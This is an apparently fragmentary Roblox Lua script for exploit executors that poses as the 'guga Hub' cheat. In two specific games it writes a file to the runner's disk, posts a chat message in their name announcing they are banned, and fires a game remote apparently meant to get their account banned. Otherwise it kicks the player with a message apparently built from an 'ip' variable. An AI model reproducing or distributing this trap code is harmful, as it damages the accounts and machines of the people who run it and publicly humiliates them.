...
if game.PlaceId == 6403373529 then
    if writefile and not isfile("guga#1638 was here") then
        writefile("guga#1638 was here.gif", game:HttpGet("https://media.tenor.com/PHREyAefRckAAAAS/packwatch.gif"))
    end
    ...
    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Message from guga: This player has been banned while attempting to use our script! Enjoy playing the game free of hackers.", "All")
    game.ReplicatedStorage.WalkSpeedChanged:FireServer("Banned whilst using guga Hub! banned people: " .. game.Players.LocalPlayer.leaderstats.Slaps.Value)
elseif game.PlaceId == 11520107397 then
    if writefile and not isfile("guga#1638 was here.gif") then
        writefile("guga#1638 was here.gif", game:HttpGet("https://media.tenor.com/PHREyAefRckAAAAS/packwatch.gif"))
    end
    ...
    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Message from guga: This player has been banned while attempting to use our script! Enjoy playing the game free of hackers.", "All")
    game.ReplicatedStorage.WalkSpeedChanged:FireServer("Banned whilst using guga Hub! banned players: " .. game.Players.LocalPlayer.leaderstats.Slaps.Value)
else
    ...
    setclipboard("guga#1638")
		
	game.Players.LocalPlayer:Kick(ip)
